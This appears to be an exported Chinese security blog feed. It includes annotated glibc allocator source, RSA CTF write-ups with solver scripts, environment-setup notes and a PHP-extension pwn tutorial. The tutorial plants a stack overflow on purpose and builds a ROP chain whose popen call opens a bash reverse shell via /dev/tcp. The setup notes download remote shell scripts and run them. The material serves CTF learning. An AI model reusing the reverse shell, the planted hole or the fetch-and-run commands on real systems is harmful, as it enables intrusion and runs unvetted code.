catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2); /* 使用lock-free技术实现fast bin的单向链表插入操作 */ if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect (old_idx != idx, 0)) &#123; errstr = "invalid fastbin entry (free)"; goto errout; &#125; &#125; else if (!chunk_is_mmapped(p)) &#123; /* 当前free的chunk不是通过mmap()分配的,并且当前还没有获得分配区的锁,获取分配区的锁 */ if (! have_lock) &#123; (void)mutex_lock(&amp;av-&gt;mutex); locked = 1; &#125; nextchunk = chunk_at_offset(p, size); /* 安全检测 */ if (__glibc_unlikely (p == av-&gt;top)) &#123; errstr = "double free or corruption (top)"; goto errout; &#125; if (__builtin_expect (contiguous (av) &amp;&amp; (char *) nextchunk &gt;= ((char *) av-&gt;top + chunksize(av-&gt;top)), 0)) &#123; errstr = "double free or corruption (out)"; goto errout; &#125; if (__glibc_unlikely (!prev_inuse(nextchunk))) &#123; errstr = "double free or corruption (!prev)"; goto errout; &#125; nextsize = chunksize(nextchunk); if (__builtin_expect (nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0)) &#123; /* 计算当前free的chunk的下一个相邻chunk的大小,该大小如果小于等于2*SIZE_SZ或是大于了分配区所分配区的内存总量,报错 */ errstr = "free(): invalid next size (normal)"; goto errout; &#125; free_perturb (chunk2mem(p), size - 2 * SIZE_SZ); if (!prev_inuse(p)) &#123; /* 如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并 */ prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); &#125; if (nextchunk != av-&gt;top) &#123; /* 与当前free的chunk相邻的下一个chunk不是分配区的top chunk */ nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) &#123; /* 如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并 */ unlink(av, nextchunk, bck, fwd); size += nextsize; &#125; else /* 与当前free的chunk相邻的下一个chunk处于inuse状态,清除当前chunk的inuse状态 */ clear_inuse_bit_at_offset(nextchunk, 0); bck = unsorted_chunks(av); fwd = bck-&gt;fd; if (__glibc_unlikely (fwd-&gt;bk != bck)) &#123; errstr = "free(): corrupted unsorted chunks"; goto errout; &#125; p-&gt;fd = fwd; p-&gt;bk = bck; if (!in_smallbin_range(size)) &#123; p-&gt;fd_nextsize = NULL; p-&gt;bk_nextsize = NULL; &#125; bck-&gt;fd = p; fwd-&gt;bk = p; /* 将合并后的chunk加入unsorted bin的双向循环链表中 */ set_head(p, size | PREV_INUSE); set_foot(p, size); check_free_chunk(av, p); &#125; else &#123; /* 当前free的chunk下一个相邻的chunk为top chunk,则将当前chunk合并入top chunk */ size += nextsize; set_head(p, size | PREV_INUSE); av-&gt;top = p; check_chunk(av, p); &#125; if ((unsigned long)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123; /* 如果合并后的chunk大小大于64KB */ if (have_fastchunks(av)) malloc_consolidate(av); if (av == &amp;main_arena) &#123;#ifndef MORECORE_CANNOT_TRIM if ((unsigned long)(chunksize(av-&gt;top)) &gt;= (unsigned long)(mp_.trim_threshold)) /* 如果当前分配区为主分配区且top chunk的大小大于heap的收缩阈值,调用sYSTRIm()函数收缩heap */ systrim(mp_.top_pad, av);#endif &#125; else &#123; /* 为非主分配区,调用heap_trim()函数收缩非主分配区的sub_heap */ heap_info *heap = heap_for_ptr(top(av)); assert(heap-&gt;ar_ptr == av); heap_trim(heap, mp_.top_pad); &#125; &#125; if (! have_lock) &#123; /* 有锁则对分配区解锁 */ assert (locked); (void)mutex_unlock(&amp;av-&gt;mutex); &#125; &#125; else &#123; /* 当前free的chunk是通过mmap()分配则调用munma_chunk()释放内存 */ munmap_chunk (p); &#125;&#125; systrim 12345678910111213141516171819202122232425262728293031323334353637383940414243444546static int systrim (size_t pad, mstate av) &#123; long top_size; /* Amount of top-most memory */ long extra; /* Amount to release */ long released; /* Amount actually released */ char *current_brk; /* address returned by pre-check sbrk call */ char *new_brk; /* address returned by post-check sbrk call */ size_t pagesize; long top_area; pagesize = GLRO (dl_pagesize); top_size = chunksize (av-&gt;top); top_area = top_size - MINSIZE - 1; if (top_area &lt;= pad) return 0; extra = ALIGN_DOWN(top_area - pad, pagesize); /* 计算top chunk中最大可释放的整数页大小,top chunk中至少需要MINSIZE的内存保存fencepost */ if (extra == 0) return 0; current_brk = (char *) (MORECORE (0)); if (current_brk == (char *) (av-&gt;top) + top_size) &#123; /* 如果当前top chunk的结束地址与当前的brk值相等,执行heap收缩。 */ MORECORE (-extra); /* 调用sbrk()释放指定大小的内存 */ void (*hook) (void) = atomic_forced_read (__after_morecore_hook); if (__builtin_expect (hook != NULL, 0)) (*hook)(); new_brk = (char *) (MORECORE (0)); LIBC_PROBE (memory_sbrk_less, 2, new_brk, extra); if (new_brk != (char *) MORECORE_FAILURE) &#123; /* 计算释放的内存大小,更新当前分配区所分配的内存总量,更新top chunk的大小 */ released = (long) (current_brk - new_brk); if (released != 0) &#123; av-&gt;system_mem -= released; set_head (av-&gt;top, (top_size - released) | PREV_INUSE); check_malloc_state (av); return 1; &#125; &#125; &#125; return 0;&#125; munmap_chunk 12345678910111213141516171819static void internal_function munmap_chunk (mchunkptr p) &#123; INTERNAL_SIZE_T size = chunksize (p); assert (chunk_is_mmapped (p)); uintptr_t block = (uintptr_t) p - p-&gt;prev_size; size_t total_size = p-&gt;prev_size + size; if (__builtin_expect (((block | total_size) &amp; (GLRO (dl_pagesize) - 1)) != 0, 0)) &#123; /* 校验内存块的起始地址是否是对齐的 */ malloc_printerr (check_action, "munmap_chunk(): invalid pointer", chunk2mem (p), NULL); return; &#125; atomic_decrement (&amp;mp_.n_mmaps); atomic_add (&amp;mp_.mmapped_mem, -total_size); /* 更新分配区的mmap统计信息 */ __munmap ((char *) block, total_size); /* 调用munmap()函数释放chunk */&#125;]]></content>
      <categories>
        <category>CS</category>
        <category>RTFSC</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-crypto-collection]]></title>
    <url>%2Fposts%2F6d6e1fc1%2F</url>
    <content type="text"><![CDATA[rsa 2018 CodeGate CTF Rsababy 1234567891011121314def GenerateKeys(p, q): e = 65537 n = p * q pi_n = (p - 1) * (q - 1) d = mulinv(e, pi_n) h = (d + p)^(d - p) g = d * (p - 0xdeadbeef) return [e, n, h, g] # print("[*] Encrypted Data : %d\n" % EncryptedData) # print("[*] N : %d\n" % N) # print("[*] h : %d\n" % hint) # print("[*] g : %d\n" % gint) 令\(const = 0xdeadbeef\). \[ \begin{align} eg &amp;= ed*(p-const)\\ 2^{eg} &amp;= 2^{ed*(p-const)} \equiv 2^{p-const} \pmod{n}\\ 2^{p-const}*2^{const-1} &amp;= 2^{p-1} \pmod{n}\\ 2^{p-1} &amp;= 2^{eg}*2^{const-1} + kn\\ p &amp;| 2^{p-1} - 1\\ p &amp;| 2^{eg}*2^{const-1} + kn - 1\\ p &amp;| 2^{eg}*2^{const-1} - 1\\ p &amp;| gcd(2^{eg}*2^{const-1} - 1, n)\\ p &amp;= gcd(2^{eg}*2^{const-1} - 1, n)\\ \end{align} \] 1234567tmp = gmpy2.powmod(2,e*g+const-1,n)-1p = gmpy2.gcd(tmp,n)q = n/pphin = (p-1)*(q-1)d =gmpy2.invert(e,phin)plain = gmpy2.powmod(data,d,n)print hex(plain)[2:].decode('hex') 2018 国家安全周 pure math 1234561) p ** p % q = 11379733163430890293873651352508351338039758692587147147905977435852516817513616846986326091648839884553022376414890361386615967542397991220815286623954922) q ** q % p = 69013831844777563245846514648957431326031155526068527290501862897485587606922610581410151992619464838090043737281355684837012749087170041977761132278153233) (p ** q + q ** p) % (p*q) = 167912873914948930240316886993608859961808808074277157008006447596809861202423839305584101473413402254209913681148587914476993997023903581844123016444594064) (p+q) ** (p+q) % (p*q) = 631122118608891537290034013816210681909064339692430795434383866866213893925838497482402736436142581734234742993872341755086491977802067570673544264245705861019085716007437923281631634585001387999769447021557791968495850833973957500181486528641583882471631090772153945389304988771754742255713939014604346792795) FLAG ** 31337 % (p*q) = 6931243291746179589612148118911670244427928875888377273917973305632621316868302667641610838193899081089153471883271406133321321416064760200919958612671379845738048938060512995550639898688604592620908415248701721672948126507753670027043162669545932921683579001870526727737212722417683610956855529996310258030Now, what’s the FLAG??? 将前4个式子的结果记为\(x_1,x_2,x_3,x_4\). \[ \begin{align} x_1 &amp;= p^p mod q\\ x_2 &amp;= q^q mod p\\ x_3 &amp;= (p^q + q^p) mod pq\\ x_4 &amp;= (p + q)^{p + q} mod pq\\ p^{q-1} &amp;\equiv 1 \pmod{q} \\ p^q &amp;\equiv p \pmod{q} \\ q^{p-1} &amp;\equiv 1 \pmod{p} \\ q^p &amp;\equiv q \pmod{p} \\ p^q + q^p &amp;\equiv p + q \pmod{pq} = p + q = x_3\\ x_4 &amp;= (p + q)^{p + q} mod pq\\ &amp;= p^{p+q} + q^{p+q} mod pq\\ &amp;= px_1 + qx_2\\ x_4 - x_1 * x_3 &amp;= px_1 + qx_2 - px_1 - qx_1\\ &amp;= q(x_2 - x_1)\\ \end{align} \] 12345678q = (x4 - x1 * x3) / (x2 - x1)p = x3 - qphin = (p - 1) * (q - 1)d = gmpy2.invert(31337, phin)flag = gmpy2.powmod(c, d, p * q)flag = hex(flag)[2:]print flag.decode('hex') 2018 Pwnhub LHY 11 + 1 + 2 ** 2018 == 30097557298197417800049182668952226601954645169633891463401117760245367082644152355564014438095421962150109895432272944128252155287648477680131934943095113263121691874508742328500559321036238322775864636883202538152031804102118831278605474474352011895348919417742923873371980983336517409056008233804190890418285814476821890492630167665485823056526646050928460488168341721716361299816947722947465808004305806687049198633489997459201469227952552870291934919760829984421958853221330987033580524592596407485826446284220272614663464267135596497185086055090126893989371261962903295313304735911034185619611156742146 \(x + 1\)和\(y\)都是质数,\((x ** 2 - 1) ** 2\)整除\(2 * x * y - 1\). 为了式子能成立,猜测\(x = 2 * y\).则:\(p = next_prime(9 * (y ** 3))\),\(p = next_prime(6 * (y ** 3))\). 根据素数的间隔,可以知道 \(p\)和\(q\)最多比括号里的数字大一点.由于已知\(n\),所以已知\(y\)的上界,利用二分查找的方式来寻找\(p\)和 \(q\). 123456789101112131415161718192021end = gmpy2.iroot(n / 54, 6)[0]beg = end - 2000000mid = 1while beg &lt; end: mid = (beg + end) / 2 if gmpy2.is_prime(mid) != 1: mid = gmpy2.next_prime(mid) p = gmpy2.next_prime(9 * mid ** 3) q = gmpy2.next_prime(6 * mid ** 3) n1 = p * q if n1 == n: phin = (p - 1) * (q - 1) d = gmpy2.invert(0x10001, phin) m = gmpy2.powmod(enc, d, n) print hex(m)[2:].strip('L').decode('hex') exit(0) elif n1 &lt; n: beg = mid else: end = mid 2017 SECCON very smooth 解压获得一个加密的流量文件,首先\(binwalk\)从加密的流量文件中取出证书. 1binwalk -e s.pcap 查看三个证书,三个模数都一样,取任意一个进行分析. 1234567891011121314151617181920212223242526272829303132333435363738394041$ openssl x509 -inform DER -in FC6.crt -pubkey -text -modulus -noout-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDVRqqCXPYd6Xdl9GT7/kiJrYvy8lohddAsi28qwMXCe2cDWuwZKzdB3R9NEnUxsHqwEuuGJBwJwIFJnmnvWurHjcYjDUddp+4X8C9jtvCaLTgd+baSjo2eB0f+uiSL/9/4nN+vR3FliRm2mByeFCjppTQlyioxCqbXYIMxGO4NcQIDAQAB-----END PUBLIC KEY-----Certificate: Data: Version: 1 (0x0) Serial Number: 11640506567126718943 (0xa18b630c7b3099df) Signature Algorithm: sha256WithRSAEncryption Issuer: C=JP, ST=Kawasaki, O=SRL Validity Not Before: Oct 8 02:47:17 2017 GMT Not After : Oct 8 02:47:17 2018 GMT Subject: C=JP, ST=Kawasaki, O=SRL Subject Public Key Info: Public Key Algorithm: rsaEncryption Public-Key: (1024 bit) Modulus: 00:d5:46:aa:82:5c:f6:1d:e9:77:65:f4:64:fb:fe: 48:89:ad:8b:f2:f2:5a:21:75:d0:2c:8b:6f:2a:c0: c5:c2:7b:67:03:5a:ec:19:2b:37:41:dd:1f:4d:12: 75:31:b0:7a:b0:12:eb:86:24:1c:09:c0:81:49:9e: 69:ef:5a:ea:c7:8d:c6:23:0d:47:5d:a7:ee:17:f0: 2f:63:b6:f0:9a:2d:38:1d:f9:b6:92:8e:8d:9e:07: 47:fe:ba:24:8b:ff:df:f8:9c:df:af:47:71:65:89: 19:b6:98:1c:9e:14:28:e9:a5:34:25:ca:2a:31:0a: a6:d7:60:83:31:18:ee:0d:71 Exponent: 65537 (0x10001) Signature Algorithm: sha256WithRSAEncryption 78:92:11:fb:6c:e1:7a:f7:2a:33:b8:8b:08:a7:f7:5b:de:cf: 62:0b:a0:ed:be:d0:69:88:38:93:94:9d:05:41:73:bd:7e:b3: 32:ec:8e:10:bc:3a:62:b0:56:c7:c1:3f:60:66:a7:be:b9:46: f7:46:22:6a:f3:5a:25:d5:66:94:57:0e:fc:b5:16:33:05:1c: 6f:f5:85:74:57:a4:a0:c6:ce:4f:fd:64:53:94:a9:83:b8:96: bf:5b:a7:ee:8b:1e:48:a7:d2:43:06:0e:4f:5a:86:62:69:05: e2:c0:bd:4e:89:c9:af:04:4a:77:a2:34:86:6a:b8:d2:3b:32: b7:39Modulus=D546AA825CF61DE97765F464FBFE4889AD8BF2F25A2175D02C8B6F2AC0C5C27B67035AEC192B3741DD1F4D127531B07AB012EB86241C09C081499E69EF5AEAC78DC6230D475DA7EE17F02F63B6F09A2D381DF9B6928E8D9E0747FEBA248BFFDFF89CDFAF4771658919B6981C9E1428E9A53425CA2A310AA6D760833118EE0D71 题目名为\(very smooth\),使用\(primefac\)分别尝试\(Pollard&#39;s p − 1\)与\(Williams&#39;s p + 1\)算法. 1234$ python -m primefac -vs -m=p+1 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897: p+1 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897Z309 = P155 x P155 = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001 x 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897 然后利用分解出来的\(p\),\(q\)导出私钥证书. 123456789101112from Crypto.PublicKey import RSAimport gmpy2def main(): n = 149767527975084886970446073530848114556615616489502613024958495602726912268566044330103850191720149622479290535294679429142532379851252608925587476670908668848275349192719279981470382501117310509432417895412013324758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L p = 11807485231629132025602991324007150366908229752508016230400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001L q = 12684117323636134264468162714319298445454220244413621344524758865071052169170753552224766744798369054498758364258656141800253652826603727552918575175830897L e = 65537L priv = RSA.construct((n, e, long(gmpy2.invert(e, (p - 1) * (q - 1))))) open('private.pem', 'w').write(priv.exportKey('PEM'))main() 将私钥导入到\(wireshark\)中即可得到明文(\(Edit -&gt; Preferences -&gt; Protocols -&gt; SSL(TLS) -&gt; RSA Key List\)). 12345678&lt;html&gt;&lt;head&gt;&lt;title&gt;Very smooth&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Answer: One of these primes is very smooth.&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; nextrsa_nextprime 1234# n = 0x78e2e04bdc50ea0b297fe9228f825543f2ee0ed4c0ad94b6198b672c3b005408fd8330c36f55d36fb129d308c23e5cb8f4d61aa7b058c23607cef83d63c4ed0f066fc0b3c0062a2ac68c75ca8035b3bd7a320bdf29cfcf6cc30377743d2a8cc29f7c588b8043412366ab69ec824309cb1ef3851d4fb14a1f0a58e4a1193f5518fa1d0c159621e1f832b474182593db2352ef05101bf367865ad26efe14fce977e9e48d3310a18b67991958d1a01bd0f3276a669866f4deaef2a68bfaefd35fe2ba5023a22c32ae8b2979c26923ee3f855363f18d8d58bb1bc3b7f585c9d9f6618c727f0f7b9e6f32af2864a77402803011874ed2c65545ced72b183f5c55d4d1# e = 0x10001# nextprime(p) * nextprime(q) = 0x78e2e04bdc50ea0b297fe9228f825543f2ee0ed4c0ad94b6198b672c3b005408fd8330c36f55d36fb129d308c23e5cb8f4d61aa7b058c23607cef83d63c4ed0f066fc0b3c0062a2ac68c75ca8035b3bd7a320bdf29cfcf6cc30377743d2a8cc29f7c588b8043412366ab69ec824309cb1ef3851d4fb14a1f0a58e4a1193f5a58ee70a59ac06b64dbe04b876ff69436b78cf03371f2062707897bf4e580870e42b5e62709b69f6d4939ac5641ea0f29de44aaee8f2fcd0f66aaa720b584f7c801e52ce7cd41db45ceb99ebd7b51bef8d0cd2deb5c50b59f168276c9c98d46a1c37bd3d6ef81f2c6e89028680a172e00d92dd8b392135112dd16efab57d00b26b9# c = 0x1c3588ac81ec3d1b439cfd2d5e6e8a5a95c8f95aaeff1b0ba49276ade80435323f307a17006ae2ffb4ca321e54387d9b33ed7ccda3117f7bc8d247ffd2ccdd67b7e2aad3d908d0a5187a73d13d532c1cf41758e2743bd4359bf72a99bbf0d716bb171cf636bd56acee9551cbb8af25f32583facbd25aed232659d24580c5a30a080e2860790a65422f7c442559c3042d37fdd7e8c1dd604252a2cbff8c74e5a0b6a0dfb9dcfed9eed515705ab9214dcf2dabce7b354040940613d065918079b3197da948b6d1d7daccc417069f7102fd2525e879fe69b6d5fb39e1dd6c0a9a9087dcc809294d7774efb42829f6124dff4af44f308977d1f91422c63073176026 1234567891011121314151617from gmpy2 import is_prime as primefrom gmpy2 import irootn = 15260473398916071686287752340249158279343013077145667794514717692352941873466690686288442204714585854869226872705293008837554012949598044297596015507031315006195230644722581744643756573982729344499452200116366327869178694692162014446578711956663348262932703160394101606708475725742890049311933691849747707673216322758418530420118502556719323543077771821163439824876751874675862075401986796272014746925015772045578403357300038192830197985871077621213669817380577176611560467051848951044963527185916781094981810804641387975398361694935093473717039550361644252381923994841138817152748279477868854093033234031994635408593nn = 15260473398916071686287752340249158279343013077145667794514717692352941873466690686288442204714585854869226872705293008837554012949598044297596015507031315006195230644722581744643756573982729344499452200116366327869178694692162014446578711956663348262932703160394101606708475725742890049311933691849747707914818082716474881224336472709074679047145667796106895298086129057288449508218237679974321952279429832707229303594474494519945899481320231091983665654947081839784375373657345023890332691371443571370016623789041883821610353473726465037590414008198228956920913181526550775524028059426312173493877228564452496582329t = nn - nf1 = lambda x, y: pow(x * y - t, 2) - 4 * n * x * yf2 = lambda x, y, s: (t - x * y - s) / (2 * x)for x in xrange(1, 3000): for y in xrange(1, 3000): print x, y if f1(x, y) &gt;= 0: s, b = iroot(f1(x, y), 2) if b: if prime(f2(x, y, int(s))): print "Success" print f2(x, y, int(s)) exit() \[ \begin{align} p * q &amp;= n\\ (p + x)(q + y) &amp;= nn\\ t &amp;= xy + py + qx\\ xq^2 + (xy - t)q + ny &amp;= xq^2 - (py + qx)q + ny\\ &amp;= 0\\ \end{align} \] 该方程有素数解即可,可爆破\(x\),\(y\). 第二种:因为\(n = p * q,nn = p1 * q1\),因为\(n\)和\(nn\)很相近,所以\(n * nn\)用\(yafu\)很快就能跑出来,可以得到\(p * q1,q * p1\),然后\(gcd\)即可.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-WEBPWN基础]]></title>
    <url>%2Fposts%2Fa6939fc8%2F</url>
    <content type="text"><![CDATA[0x00 现在大部分WEBPWN就是通过存在漏洞的PHP动态扩展库来劫持控制流反弹shell. 一个简单的demo 编译环境 123456sudo apt-get install bison libxml2 libxml2-devsudo apt-get install php php-devphp -v#版本php -i | grep -i extension_dir#扩展模块放置的路径 下载对应版本的源代码:https://github.com/php/php-src/releases. 进入源代码目录,使用脚本生成扩展模块的工程项目,然后单独编译扩展模块. 12345php-src-php-7.2.24/ext$ ./ext_skel --extname=easy_phppwnphp-src-php-7.2.24/ext$ cd easy_phppwn/php-src-php-7.2.24/ext/easy_phppwn$ /usr/bin/phpizephp-src-php-7.2.24/ext/easy_phppwn$ ./configure --with-php-config=/usr/bin/php-config7.2php-src-php-7.2.24/ext/easy_phppwn$ make make生成的文件在./modules目录下,make install可以安装扩展模块到指定的php版本. php --ini找到php.ini,在php.ini中增加extension=easy_phppwn.so 漏洞函数 在easy_phppwn.c中编写扩展函数. 123456789101112PHP_FUNCTION(easy_phppwn_hello) &#123; char *arg = NULL; size_t arg_len, len; zend_string *strg; char buf[0x20]; if (zend_parse_parameters(ZEND_NUM_ARGS(), "s", &amp;arg, &amp;arg_len) == FAILURE) &#123; return; &#125; read(0, buf, 0x200); php_printf("Hello\n"); return SUCCESS;&#125; 并在初始化函数中调用,编译时需要去掉Makefile中的-O2,否则会开启FORTIFY. 1234const zend_function_entry easy_phppwn_functions[] = &#123; PHP_FE(easy_phppwn_hello, NULL) PHP_FE_END&#125;; 调用漏洞函数. 123&lt;?php easy_phppwn_hello("unuse");?&gt; 调试 函数名需要处理一下,easy_phppwn_hello实际上是zif_easy_phppwn_hello(IDA中可以看见真实的函数名),然后下断点调试即可. 12345from pwn import *r = process(["php", "test.php"])gdb.attach(r)r.interactive() 获取shell 可以通过使用popen来开启一个反弹shell. 1234567891011121314command = '/bin/bash -c "/bin/bash -i &gt;&amp;/dev/tcp/127.0.0.1/6666 0&gt;&amp;1"'layout = [ padding, pop_rdi_ret, stack_addr + 0x88 + 0x30 + 0x60, pop_rsi_ret, stack_addr + 0x88 + 0x28, popen_addr, 'r' + 'x00' * 7, 'a' * 0x60, command.ljust(0x60, 'x00'), "a" * 0x8]]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w4rd3n-centos虚拟机环境搭建]]></title>
    <url>%2Fposts%2Fb7f006df%2F</url>
    <content type="text"><![CDATA[VPS 购买VPS服务器 推荐:在vultr官网购买,操作系统选centos6,centos7默认的防火墙可能会干扰SSR的正常连接. 如果开启vps的ipv6,可以在后台设置选项找到服务器ipv6 ip.在部署SSR账号时,用ipv6 ip就行.需要电脑系统开启ipv6. 部署VPS服务器 远程登录到vps服务器,执行脚本. 12yum -y install wgetwget -N --no-check-certificate https://raw.githubusercontent.com/hombo125/doubi/master/ssr.sh &amp;&amp; chmod +x ssr.sh &amp;&amp; bash ssr.sh 此脚本是开机自动启动,部署一次即可. 加速VPS服务器 使用谷歌BBR加速,vultr的服务器框架可以装BBR加速. 1wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh &amp;&amp; chmod +x bbr.sh &amp;&amp; ./bbr.sh 此脚本也是开机自动启动,部署一次即可.安装完后重启. 输入命令lsmod | grep bbr,如果出现tcp_bbr字样表示bbr已安装并启动成功. CTF平台 docker,docker-compose安装 123456789yum updateyum install -y yum-utils device-mapper-persistent-data lvm2yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repoyum install -y docker-cesystemctl start dockersystemctl enable dockeryum -y install epel-releaseyum -y install python-pippip install -i https://pypi.tuna.tsinghua.edu.cn/simple docker-compose 换源后重启docker服务即可. 1sudo vim /etc/docker/daemon.json 1&#123;"registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]&#125; CTFd搭建 直接docker搭建即可. 123git clone https://github.com/CTFd/CTFd.gitcd CTFddocker run -d -p 8000:8000 -it ctfd/ctfd pwn题部署 将程序io重定向到某端口. 1socat TCP-LISTEN:1234,reuseaddr,fork EXEC:./test 基于xinted + docker. 12345git clone https://github.com/Eadom/ctf_xinetd.gitrm ctf_xinetd/bin/helloworldcp pwn ctf_xinetd/bin/pwnecho &lt;newflag&gt; &gt; ctf_xinetd/bin/flagvim ctf_xinetd/ctf.xinetd ctf.xinetd中主要修改server_args = --userspec=1000:1000 /home/ctf ./helloworld中的helloworld为二进制文件名称(pwn). 123cd ctf_xinetdsudo docker build -t "mypwn" .sudo docker run -d -p "0.0.0.0:8001:9999" -h "mypwn" --name="mypwn" mypwn pwn题要先关闭缓冲区. 123setvbuf(stdin, 0LL, 2, 0LL);setvbuf(stdout, 0LL, 2, 0LL);setvbuf(stderr, 0LL, 2, 0LL); 注意,docker里的libc文件可能与原生系统中的有细微区别,比如偏移. crypto题部署 1234567891011121314FROM ubuntu:16.04RUN sed -i "s/http:\/\/archive.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.list &amp;&amp; sed -i "s/http:\/\/security.ubuntu.com/http:\/\/mirrors.tuna.tsinghua.edu.cn/g" /etc/apt/sources.listRUN apt-get update &amp;&amp; apt-get -y dist-upgrade &amp;&amp; apt-get install socat python -yRUN useradd -m ctfWORKDIR /home/ctfCOPY crypto.py /home/ctf/crypto.pyRUN chmod +x /home/ctf/crypto.pyCMD ["socat", "TCP4-LISTEN:1234,fork", "EXEC:\"python -u /home/ctf/crypto.py\""]EXPOSE 1234]]></content>
      <categories>
        <category>w4rd3n</category>
      </categories>
      <tags>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Math-number-theory-数论概论读书笔记]]></title>
    <url>%2Fposts%2Febac7ece%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>Math</category>
      </categories>
      <tags>
        <tag>number-theory</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-crypto-非对称加密-RSA]]></title>
    <url>%2Fposts%2F907d0880%2F</url>
    <content type="text"><![CDATA[基础 \(RSA\)加密算法是一种非对称加密算法,\(RSA\)算法的可靠性由极大整数因数分解的难度决定. 首先选取两个素数\(p\),\(q\). 接下来将\(p\)和\(q\)相乘获得模\(m = p * q\).同时也就知道了:\(\phi(m) = \phi(p) * \phi(q) = (p − 1)(q − 1)\). 选取与\(\phi(m)\)互素的整数\(k\),即\(gcd(k, \phi(m)) = 1\). 此时可以将\(m\)和\(k\)作为公钥告诉别人,别人可以利用\(m\)和\(k\)加密信息,收到密文后通过\(\phi(m)\)计算模\(m\)的\(k\)次根求出明文即可. 加密过程 将明文数串分段成小于\(m\)的数,从而获得一个数表\(a_1\),\(a_2\),...,\(a_r\). 使用逐次平方法计算\(a_1^k \pmod{m}\),\(a_2^k \pmod{m}\),...,\(a_r^k \pmod{m}\), 获得一个新的数表\(b_1\),\(b_2\),...,\(b_r\),也就是加密后的密文. 解密过程 获取加密后的数表\(b_1\),\(b_2\),...,\(b_r\)后,实际上就是解\(a_i^k \equiv bi \pmod{m}\). 由于自己拥有\(p\)和\(q\),可以计算出\(\phi(m) = \phi(p) * \phi(q) = (p − 1)(q − 1)\). 所以可以使用计算模\(m\)的\(k\)次根的方法求出\(a_i\). \(b_i\),\(k\),\(m\)是已知整数,满足\(gcd(i, m) = 1\),与\(gcd(k, \phi(m)) = 1\). 可以通过下列步骤求出同余式\(a_i^k \equiv i \pmod{m}\)的解. 计算\(\phi(m)\). 求满足\(ku − \phi(m)v = 1\)的正整数\(u\)与\(v\).\(u\)就是\(k\)在模\(\phi(m)\)意义下的逆元. 用逐次平方法求\(b_i^u \pmod{m}\),所得值给出解\(ai\). 可以发现,计算模\(m\)的\(k\)次根方法中\(u\)由\(k\)和\(\phi(m)\)确定,可以通过扩展欧几里得算法求得. \(ku − \phi(m)v = 1\),等价于\(ku − \phi(m)v = gcd(k, \phi(m))\). \[ r_1 = \phi(m) − q_1 * k\\ r_2 = k − q_2 * r_1 = k − q_2 * (\phi(m) − q_1 * k)\\ ...\\ r_n = gcd(k, \phi(m)) = 1 = ku − \phi(m)v\\ \] \(u_0 = 0\),\(u_1 = 1\),\(u_{i+1} = u_{i-1} - q_1 * u_i\). \(v_0 = 1\),\(v_1 = 0\),\(v_{i+1} = v_{i-1} - q_1 * v_i\). python代码实现 12345678910111213141516171819202122232425262728293031323334353637383940def egcd(a, b): r_0 = a r_1 = b r_2 = r_0 % r_1 q = r_0 // r_1 u_0 = 0 u_1 = 1 u_2 = u_0 - q * u_1 while r_2: r_0 = r_1 r_1 = r_2 r_2 = r_0 % r_1 q = r_0 // r_1 u_0 = u_1 u_1 = u_2 u_2 = u_0 - q * u_1 u_0 = u_1 u_1 = u_2 u_2 = u_0 - q * u_1 return u_2class myRSA(object): def __init__(self, p, q, e): self.N = p * q print("N: " + str(self.N)) self.phiN = (p - 1) * (q - 1) self.e = e # undo:check e self.d = egcd(self.phiN, self.e) while self.d &lt; 0: self.d = self.d + self.phiN print("d: " + str(self.d)) def encode(self, m): c = pow(m, self.e, self.N) return c def decode(self, c): m = pow(c, self.d, self.N) return m tool 123git clone https://github.com/ius/rsatool.gitcd rsatoolpython rsatool.py -h RsaCtfTool.py. RsaConverter.exe. 12345678910#将数转化为AB CD EF格式的字符串.s = hex(N)[2:-1]if len(s) % 2: s = "0" + ss2 = ""for i in range(0, len(s), 2): s2 += s[i:i+2] s2 += " "print s2 素因子分解工具. yafu. msieve. openssl \(openssl rsautl\). 1openssl rsautl [-in file] [-out file] [-inkey file] [-passin arg] [-keyform PEM|DER|NET] [-pubin] [-certin][-asn1parse] [-hexdump] [-raw] [-oaep] 